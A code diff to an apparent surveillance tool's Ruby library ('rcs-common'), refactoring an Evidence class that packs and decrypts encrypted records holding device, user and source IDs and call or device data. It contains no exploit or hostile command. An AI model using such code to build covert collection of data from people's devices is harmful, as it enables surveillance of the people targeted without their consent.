@@ -16,9 +16,10 @@ require 'securerandom'
 
 # evidence types
 require 'rcs-common/evidence/common'
-require 'rcs-common/evidence/call'
-require 'rcs-common/evidence/device'
-require 'rcs-common/evidence/info'
+
+Dir[File.dirname(__FILE__) + '/evidence/*.rb'].each do |file|
+  require file
+end
 
 module RCS
 
@@ -55,16 +56,15 @@ class Evidence
     extend_on_type EVIDENCE_TYPES[id]
   end
   
-  def generate_header
+  def generate_header(type_id)
     thigh, tlow = @info[:acquired].to_filetime
     deviceid_utf16 = @info[:device_id].to_utf16le_binary
     userid_utf16 = @info[:user_id].to_utf16le_binary
     sourceid_utf16 = @info[:source_id].to_utf16le_binary
     
     add_header = ''
-    if respond_to? :additional_header
-      add_header = additional_header
-    end
+    add_header = additional_header if respond_to? :additional_header
+    
     additional_size = add_header.size
     struct = [Evidence.VERSION_ID, type_id, thigh, tlow, deviceid_utf16.size, userid_utf16.size, sourceid_utf16.size, additional_size]
     header = struct.pack("I*")
@@ -72,7 +72,7 @@ class Evidence
     header += deviceid_utf16
     header += userid_utf16
     header += sourceid_utf16
-    header += add_header
+    header += add_header.to_binary
     
     return encrypt(header)
   end
@@ -107,7 +107,8 @@ class Evidence
     extend_on_type @info[:type]
     
     # header
-    @binary = append_data(generate_header)
+    type_id = EVIDENCE_TYPES.invert[type]
+    @binary = append_data(generate_header(type_id))
     
     # content
     if respond_to? :generate_content
@@ -156,6 +157,8 @@ class Evidence
     
     # header
     header_length = read_uint32(binary_string)
+
+    # decrypt header
     header_string = StringIO.new decrypt(binary_string.read header_length)
     @version = read_uint32(header_string)
     @type_id = read_uint32(header_string)
@@ -171,6 +174,7 @@ class Evidence
     
     @info[:received] = Time.new.getgm
     @info[:acquired] = Time.from_filetime(time_h, time_l).getgm
+
     @info[:device_id] = header_string.read(host_size).force_encoding('UTF-16LE').encode('UTF-8') unless host_size == 0
     @info[:user_id] = header_string.read(user_size).force_encoding('UTF-16LE').encode('UTF-8') unless user_size == 0
     @info[:source_id] = header_string.read(ip_size).force_encoding('UTF-16LE').encode('UTF-8') unless ip_size == 0
@@ -190,12 +194,14 @@ class Evidence
     end
     
     # split content to chunks
-    @content = ''
+    @info[:content] = ''
     while not binary_string.eof?
       len = read_uint32(binary_string)
       content = binary_string.read align_to_block_len(len)
-      @content += StringIO.new( decrypt(content) ).read(len)
+      @info[:content] += StringIO.new( decrypt(content) ).read(len)
     end
+    
+    decode_content if respond_to? :decode_content
     
     return self
   end
